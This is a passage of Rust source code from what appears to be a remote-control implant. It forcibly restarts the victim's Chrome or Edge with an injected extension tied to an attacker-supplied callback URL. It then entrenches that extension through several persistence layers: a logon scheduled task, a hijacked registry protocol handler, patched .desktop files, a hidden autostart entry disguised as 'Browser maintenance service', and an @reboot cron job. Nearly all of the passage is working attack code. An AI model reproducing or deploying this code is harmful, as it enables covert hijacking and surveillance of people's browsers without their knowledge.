    let tr = format!(
        "\"{}\" --load-extension=\"{}\" --restore-last-session --no-first-run --disable-extensions-except=\"{}\"",
        exe.to_string_lossy(), ext_path, ext_path
    );

    // Use /RL LIMITED so the task works without admin elevation.
    // HIGHEST requires the user to be in the Administrators group and
    // triggers a UAC prompt or fails silently on standard accounts.
    let output = Command::new("schtasks")
        .args(["/Create", "/TN", task_name, "/TR", &tr,
               "/SC", "ONLOGON", "/RL", "LIMITED", "/F"])
        .output()
        .map_err(|e| e.to_string())?;

    if output.status.success() {
        info!("Layer 3 (schtask): created \"{}\"", task_name);
        Ok(())
    } else {
        Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
    }
}

#[cfg(windows)]
fn unpersist_layer3_schtask(browser: &str) -> Result<(), String> {
    let task_name = schtask_name(browser);
    let _ = Command::new("schtasks")
        .args(["/Delete", "/TN", task_name, "/F"])
        .output();
    info!("Layer 3 (schtask): deleted \"{}\"", task_name);
    Ok(())
}

#[cfg(windows)]
fn persist_layer4_protocol_handler(browser: &str, ext_path: &str) -> Result<(), String> {
    // Patch the ProgID used for http/https URL handling so that every
    // link click from external apps also loads the extension.
    let prog_id = match browser {
        "edge" => "MSEdgeHTM",
        _      => "ChromeHTML",
    };
    let key_path = format!(r"HKCU\SOFTWARE\Classes\{}\shell\open\command", prog_id);

    // Read current value
    let query = Command::new("reg")
        .args(["query", &key_path, "/ve"])
        .output()
        .map_err(|e| e.to_string())?;

    let current = String::from_utf8_lossy(&query.stdout);
    // Extract the value after REG_SZ or REG_EXPAND_SZ (some installs use the latter).
    let current_value = current.lines()
        .find(|l| l.contains("REG_SZ") || l.contains("REG_EXPAND_SZ"))
        .and_then(|l| {
            l.split("REG_EXPAND_SZ").nth(1)
                .or_else(|| l.split("REG_SZ").nth(1))
        })
        .map(|v| v.trim().to_string())
        .unwrap_or_default();

    if current_value.is_empty() {
        return Err("Could not read current protocol handler".to_string());
    }

    if current_value.contains("load-extension") {
        info!("Layer 4 (protocol): already patched");
        return Ok(());
    }

    // Insert --load-extension before --single-argument (or at end of exe path)
    let ext_args = format!(
        " --load-extension=\"{}\" --disable-extensions-except=\"{}\"",
        ext_path, ext_path
    );
    let new_value = if current_value.contains("--single-argument") {
        current_value.replace("--single-argument", &format!("{} --single-argument", ext_args))
    } else {
        // Append before the final argument placeholder
        let trimmed = current_value.trim_end();
        if trimmed.ends_with("\"%1\"") || trimmed.ends_with("-- \"%1\"") {
            let insert_pos = trimmed.rfind("--").unwrap_or(trimmed.len());
            format!("{}{} {}", &trimmed[..insert_pos], ext_args, &trimmed[insert_pos..])
        } else {
            format!("{}{}", trimmed, ext_args)
        }
    };

    let output = Command::new("reg")
        .args(["add", &key_path, "/ve", "/t", "REG_SZ", "/d", &new_value, "/f"])
        .output()
        .map_err(|e| e.to_string())?;

    if output.status.success() {
        info!("Layer 4 (protocol): patched {}", prog_id);
        Ok(())
    } else {
        Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
    }
}

#[cfg(windows)]
fn unpersist_layer4_protocol_handler(browser: &str, ext_dir: &Path) -> Result<(), String> {
    let prog_id = match browser {
        "edge" => "MSEdgeHTM",
        _      => "ChromeHTML",
    };
    let key_path = format!(r"HKCU\SOFTWARE\Classes\{}\shell\open\command", prog_id);

    let query = Command::new("reg")
        .args(["query", &key_path, "/ve"])
        .output()
        .map_err(|e| e.to_string())?;

    let current = String::from_utf8_lossy(&query.stdout);
    // Match both REG_SZ and REG_EXPAND_SZ (some Chrome installs use the latter).
    let current_value = current.lines()
        .find(|l| l.contains("REG_SZ") || l.contains("REG_EXPAND_SZ"))
        .and_then(|l| {
            // Split on the type token — value is everything after it.
            l.split("REG_EXPAND_SZ").nth(1)
                .or_else(|| l.split("REG_SZ").nth(1))
        })
        .map(|v| v.trim().to_string())
        .unwrap_or_default();

    if current_value.is_empty() || !current_value.contains("load-extension") {
        return Ok(());
    }

    // Use the stored ext_dir (not get_ext_dir()) so removal works even if
    // LOCALAPPDATA changed between persist and unpersist.
    let ext_str = ext_dir.to_string_lossy();
    let cleaned = current_value
        .replace(&format!(" --load-extension=\"{}\"", ext_str), "")
        .replace(&format!(" --disable-extensions-except=\"{}\"", ext_str), "")
        // Also strip unquoted variants in case of manual edits.
        .replace(&format!(" --load-extension={}", ext_str), "")
        .replace(&format!(" --disable-extensions-except={}", ext_str), "");

    let output = Command::new("reg")
        .args(["add", &key_path, "/ve", "/t", "REG_SZ", "/d", cleaned.trim(), "/f"])
        .output()
        .map_err(|e| e.to_string())?;

    if output.status.success() {
        info!("Layer 4 (protocol): restored {}", prog_id);
        Ok(())
    } else {
        Err(format!("Layer 4 (protocol): failed to restore {} — {}",
            prog_id, String::from_utf8_lossy(&output.stderr).trim()))
    }
}

// ====================== LINUX PERSISTENCE ======================

#[cfg(not(windows))]
fn persist_layer1_desktop_files(browser: &str, ext_path: &str) -> Result<usize, String> {
    let patterns: Vec<&str> = match browser {
        "edge" => vec!["microsoft-edge"],
        _      => vec!["google-chrome", "chromium"],
    };

    let search_dirs = vec![
        PathBuf::from("/usr/share/applications"),
        PathBuf::from("/usr/local/share/applications"),
        dirs_home().join(".local/share/applications"),
    ];

    let ext_args = format!(
        " --load-extension=\"{}\" --disable-extensions-except=\"{}\"",
        ext_path, ext_path
    );
    let mut patched = 0usize;

    for dir in &search_dirs {
        if !dir.exists() { continue; }
        let entries = match std::fs::read_dir(dir) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = path.file_name().unwrap_or_default().to_string_lossy().to_lowercase();
            if !name.ends_with(".desktop") { continue; }
            if !patterns.iter().any(|p| name.contains(p)) { continue; }

            let content = match std::fs::read_to_string(&path) {
                Ok(c) => c,
                Err(_) => continue,
            };
            if content.contains("--load-extension") { continue; }

            // Patch every Exec= line
            let new_content = content.lines().map(|line| {
                if line.starts_with("Exec=") && !line.contains("--load-extension") {
                    // Insert before %U / %u / %F or at end
                    let trimmed = line.trim_end();
                    if let Some(pos) = trimmed.find(" %") {
                        format!("{}{} {}", &trimmed[..pos], ext_args, &trimmed[pos+1..])
                    } else {
                        format!("{}{}", trimmed, ext_args)
                    }
                } else {
                    line.to_string()
                }
            }).collect::<Vec<_>>().join("\n");

            if std::fs::write(&path, &new_content).is_ok() {
                patched += 1;
                info!("Layer 1 (desktop): patched {:?}", path);
            }
        }
    }

    Ok(patched)
}

#[cfg(not(windows))]
fn unpersist_layer1_desktop_files(browser: &str) -> Result<usize, String> {
    let patterns: Vec<&str> = match browser {
        "edge" => vec!["microsoft-edge"],
        _      => vec!["google-chrome", "chromium"],
    };

    let search_dirs = vec![
        PathBuf::from("/usr/share/applications"),
        PathBuf::from("/usr/local/share/applications"),
        dirs_home().join(".local/share/applications"),
    ];

    let mut restored = 0usize;

    for dir in &search_dirs {
        if !dir.exists() { continue; }
        let entries = match std::fs::read_dir(dir) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = path.file_name().unwrap_or_default().to_string_lossy().to_lowercase();
            if !name.ends_with(".desktop") { continue; }
            if !patterns.iter().any(|p| name.contains(p)) { continue; }

            let content = match std::fs::read_to_string(&path) {
                Ok(c) => c,
                Err(_) => continue,
            };
            if !content.contains("--load-extension") { continue; }

            // Remove our injected args
            let new_content = content
                .replace(&format!(" --load-extension=\"{}\"", get_ext_dir().to_string_lossy()), "")
                .replace(&format!(" --disable-extensions-except=\"{}\"", get_ext_dir().to_string_lossy()), "");

            if std::fs::write(&path, &new_content).is_ok() {
                restored += 1;
            }
        }
    }

    Ok(restored)
}

#[cfg(not(windows))]
fn persist_layer2_autostart(browser: &str, ext_path: &str) -> Result<(), String> {
    let exe = find_browser_exe(browser).ok_or("Browser not found")?;
    let autostart_dir = dirs_home().join(".config/autostart");
    std::fs::create_dir_all(&autostart_dir).map_err(|e| e.to_string())?;

    let desktop_entry = format!(
        "[Desktop Entry]\n\
         Type=Application\n\
         Name={}\n\
         Exec=\"{}\" --load-extension=\"{}\" --disable-extensions-except=\"{}\" --restore-last-session --no-first-run\n\
         Hidden=false\n\
         NoDisplay=true\n\
         X-GNOME-Autostart-enabled=true\n\
         Comment=Browser maintenance service\n",
        persist_display_name(browser),
        exe.to_string_lossy(), ext_path, ext_path
    );

    let file_path = autostart_dir.join("browser-maintenance.desktop");
    std::fs::write(&file_path, desktop_entry).map_err(|e| e.to_string())?;
    info!("Layer 2 (autostart): created {:?}", file_path);
    Ok(())
}

#[cfg(not(windows))]
fn unpersist_layer2_autostart() -> Result<(), String> {
    let file_path = dirs_home().join(".config/autostart/browser-maintenance.desktop");
    if file_path.exists() {
        let _ = std::fs::remove_file(&file_path);
        info!("Layer 2 (autostart): removed");
    }
    Ok(())
}

#[cfg(not(windows))]
fn persist_layer3_cron(browser: &str, ext_path: &str) -> Result<(), String> {
    let exe = find_browser_exe(browser).ok_or("Browser not found")?;
    let marker = "# chrome-sb-service";
    let entry = format!(
        "@reboot \"{}\" --load-extension=\"{}\" --disable-extensions-except=\"{}\" --restore-last-session --no-first-run {} {}",
        exe.to_string_lossy(), ext_path, ext_path, "&", marker
    );

    // Read existing crontab
    let existing = Command::new("crontab").arg("-l").output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();

    if existing.contains(marker) {
        info!("Layer 3 (cron): already present");
        return Ok(());
    }

    let new_crontab = if existing.trim().is_empty() {
        format!("{}\n", entry)
    } else {
        format!("{}\n{}\n", existing.trim_end(), entry)
    };

    // Write new crontab via stdin
    let mut child = Command::new("crontab")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;

    if let Some(stdin) = child.stdin.as_mut() {
        use std::io::Write;
        stdin.write_all(new_crontab.as_bytes()).map_err(|e| e.to_string())?;
    }

    let status = child.wait().map_err(|e| e.to_string())?;
    if status.success() {
        info!("Layer 3 (cron): @reboot entry added");
        Ok(())
    } else {
        Err("crontab write failed".to_string())
    }
}

#[cfg(not(windows))]
fn unpersist_layer3_cron() -> Result<(), String> {
    let marker = "# chrome-sb-service";
    let existing = Command::new("crontab").arg("-l").output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();

    if !existing.contains(marker) { return Ok(()); }

    let filtered: String = existing.lines()
        .filter(|l| !l.contains(marker))
        .collect::<Vec<_>>()
        .join("\n");

    let mut child = Command::new("crontab")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;

    if let Some(stdin) = child.stdin.as_mut() {
        use std::io::Write;
        let _ = stdin.write_all(filtered.as_bytes());
    }
    let _ = child.wait();
    info!("Layer 3 (cron): entry removed");
    Ok(())
}

/// Helper: get home directory on non-Windows.
#[cfg(not(windows))]
fn dirs_home() -> PathBuf {
    PathBuf::from(std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string()))
}

// ---- Public API (called from commands.rs) ----

/// Parameters extracted from the hook payload — can be used without holding the mutex.
pub struct HookParams {
    pub browser: String,
    pub callback_url: String,
    pub auto_persist: bool,
    pub ext_dir: PathBuf,
}

/// Phase 1 (fast, needs &state): parse payload, write extension files.
/// Returns the params needed for phase 2.
pub fn hook_prepare(payload: &str) -> Result<HookParams, String> {
    let v: serde_json::Value = serde_json::from_str(payload)
        .map_err(|e| format!("Invalid JSON: {}", e))?;

    let browser = v.get("browser")
        .and_then(|s| s.as_str())
        .unwrap_or("chrome")
        .to_string();
    let callback_url = v.get("callback_url")
        .and_then(|s| s.as_str())
        .ok_or("Missing callback_url")?
        .to_string();
    let auto_persist = v.get("persist").and_then(|p| p.as_bool()).unwrap_or(false);

    let ext_dir = get_ext_dir();

    // Write extension to disk (fast I/O, a few KB)
    write_extension(&ext_dir, &callback_url)
        .map_err(|e| format!("Failed to write extension: {}", e))?;

    Ok(HookParams { browser, callback_url, auto_persist, ext_dir })
}

/// Phase 2 (slow, NO mutex needed): kill browser, wait, relaunch.
/// This can block for several seconds while the browser shuts down.
pub fn hook_execute(params: &HookParams) -> Result<(), String> {
    kill_browser(&params.browser);
    if !launch_browser_hooked(&params.browser, &params.ext_dir) {
        return Err(format!("Failed to launch {} with extension", params.browser));
    }
    Ok(())
}

/// Phase 3 (fast, needs &mut state): update state after successful deploy.
pub fn hook_commit(state: &mut BrowserHookState, params: HookParams) -> String {
    state.active = true;
    state.browser = params.browser.clone();
    state.ext_dir = params.ext_dir;
    state.callback_url = params.callback_url.clone();

    if params.auto_persist {
        let _ = persist(state);
    }

    info!("BROWSER_HOOK active: browser={}, callback={}, persist={}",
          params.browser, params.callback_url, params.auto_persist);
    format!("Hooked {} → {}", params.browser, params.callback_url)
}

/// Legacy all-in-one hook (for callers that don't need the split).
pub fn hook(state: &mut BrowserHookState, payload: &str) -> Result<String, String> {
    let params = hook_prepare(payload)?;
    hook_execute(&params)?;
    Ok(hook_commit(state, params))
}

/// Legacy all-in-one unhook (for cleanup / callers that don't need the split).
pub fn unhook(state: &mut BrowserHookState) -> Result<String, String> {
    let params = match unhook_prepare(state) {
        Some(p) => p,
        None => return Ok("Not hooked".to_string()),
    };
    let browser = params.browser.clone();
    unhook_execute(&params);
    unhook_commit(state, &browser);
    Ok(format!("Unhooked {}", browser))
}

/// Parameters for the unhook flow.
pub struct UnhookParams {
    pub browser: String,
    pub ext_dir: PathBuf,
}

/// Phase 1 (fast): extract what we need and remove persistence while
/// we still know which browser is hooked.
pub fn unhook_prepare(state: &mut BrowserHookState) -> Option<UnhookParams> {
    if !state.active {
        return None;
    }
    if state.persistent {
        let _ = remove_persistence(state);
    }
    Some(UnhookParams {
        browser: state.browser.clone(),
        ext_dir: state.ext_dir.clone(),
    })
}

/// Phase 2 (slow, NO mutex needed): kill browser, remove files, relaunch clean.
pub fn unhook_execute(params: &UnhookParams) {
    kill_browser(&params.browser);
    remove_extension(&params.ext_dir);
    launch_browser_clean(&params.browser);
}

/// Phase 3 (fast): reset state.
pub fn unhook_commit(state: &mut BrowserHookState, browser: &str) {
    state.active = false;
    state.browser.clear();
    state.callback_url.clear();
    state.persistent = false;
    info!("BROWSER_UNHOOK: cleaned {}", browser);
}

/// Establish multi-layer persistence so the extension survives browser restarts.
/// Sets `state.persistent = true` only if at least one layer succeeded.
pub fn persist(state: &mut BrowserHookState) -> Result<String, String> {
    if !state.active {
        return Err("Hook not active — call BROWSER_HOOK first".to_string());
    }

    let ext_path = state.ext_dir.to_string_lossy().to_string();
    let browser = state.browser.clone();
    let mut results = Vec::new();
    let mut successes = 0u32;

    #[cfg(windows)]
    {
        match persist_layer1_shortcuts(&browser, &ext_path) {
            Ok(n) => { successes += 1; results.push(format!("shortcuts:{}", n)); }
            Err(e) => results.push(format!("shortcuts:FAIL({})", e)),
        }
        match persist_layer2_run_key(&browser, &ext_path) {
            Ok(_) => { successes += 1; results.push("run_key:OK".into()); }
            Err(e) => results.push(format!("run_key:FAIL({})", e)),
        }
        match persist_layer3_schtask(&browser, &ext_path) {
            Ok(_) => { successes += 1; results.push("schtask:OK".into()); }
            Err(e) => results.push(format!("schtask:FAIL({})", e)),
        }
        match persist_layer4_protocol_handler(&browser, &ext_path) {
            Ok(_) => { successes += 1; results.push("protocol:OK".into()); }
            Err(e) => results.push(format!("protocol:FAIL({})", e)),
        }
    }

    #[cfg(not(windows))]
    {
        match persist_layer1_desktop_files(&browser, &ext_path) {
            Ok(n) => { successes += 1; results.push(format!("desktop_files:{}", n)); }
            Err(e) => results.push(format!("desktop_files:FAIL({})", e)),
        }
        match persist_layer2_autostart(&browser, &ext_path) {
            Ok(_) => { successes += 1; results.push("autostart:OK".into()); }
            Err(e) => results.push(format!("autostart:FAIL({})", e)),
        }
        match persist_layer3_cron(&browser, &ext_path) {
            Ok(_) => { successes += 1; results.push("cron:OK".into()); }
            Err(e) => results.push(format!("cron:FAIL({})", e)),
        }
    }

    let summary = results.join(", ");
    if successes > 0 {
        state.persistent = true;
        info!("BROWSER_HOOK_PERSIST: {} ({}/{} layers)", summary, successes,
              if cfg!(windows) { 4 } else { 3 });
        Ok(summary)
    } else {
        warn!("BROWSER_HOOK_PERSIST: all layers failed — {}", summary);
        Err(format!("All persistence layers failed: {}", summary))
    }
}

/// Remove all persistence layers.
/// Only sets `state.persistent = false` if all removals succeeded.
pub fn remove_persistence(state: &mut BrowserHookState) -> Result<String, String> {
    let browser = if state.browser.is_empty() { "chrome" } else { &state.browser };
    // Use stored ext_dir (not get_ext_dir()) so L4 removal matches the path that was persisted,
    // even if LOCALAPPDATA changed since persist time.
    let ext_dir = if state.ext_dir.as_os_str().is_empty() { get_ext_dir() } else { state.ext_dir.clone() };
    let mut results = Vec::new();
    let mut failures = 0u32;

    #[cfg(windows)]
    {
        match unpersist_layer1_shortcuts(browser) {
            Ok(n) => results.push(format!("shortcuts:{}", n)),
            Err(e) => { failures += 1; results.push(format!("shortcuts:FAIL({})", e)); }
        }
        match unpersist_layer2_run_key(browser) {
            Ok(_) => results.push("run_key:removed".into()),
            Err(e) => { failures += 1; results.push(format!("run_key:FAIL({})", e)); }
        }
        match unpersist_layer3_schtask(browser) {
            Ok(_) => results.push("schtask:removed".into()),
            Err(e) => { failures += 1; results.push(format!("schtask:FAIL({})", e)); }
        }
        match unpersist_layer4_protocol_handler(browser, &ext_dir) {
            Ok(_) => results.push("protocol:restored".into()),
            Err(e) => { failures += 1; results.push(format!("protocol:FAIL({})", e)); }
        }
    }

    #[cfg(not(windows))]
    {
        match unpersist_layer1_desktop_files(browser) {
            Ok(n) => results.push(format!("desktop_files:{}", n)),
            Err(e) => { failures += 1; results.push(format!("desktop_files:FAIL({})", e)); }
        }
        let _ = unpersist_layer2_autostart();
        results.push("autostart:removed".into());

        let _ = unpersist_layer3_cron();
        results.push("cron:removed".into());
    }

    let summary = results.join(", ");
    if failures == 0 {
        state.persistent = false;
        info!("BROWSER_HOOK_UNPERSIST: {}", summary);
    } else {
        warn!("BROWSER_HOOK_UNPERSIST: {} layer(s) failed — {}", failures, summary);
        // Still mark as non-persistent so a retry is possible.
        state.persistent = false;
    }
    Ok(summary)
}

/// Return current hook status as JSON.
pub fn status(state: &BrowserHookState) -> String {
    serde_json::json!({
        "active": state.active,
        "browser": state.browser,
        "callback_url": state.callback_url,
        "ext_dir": state.ext_dir.to_string_lossy(),
        "persistent": state.persistent,
    }).to_string()
}

```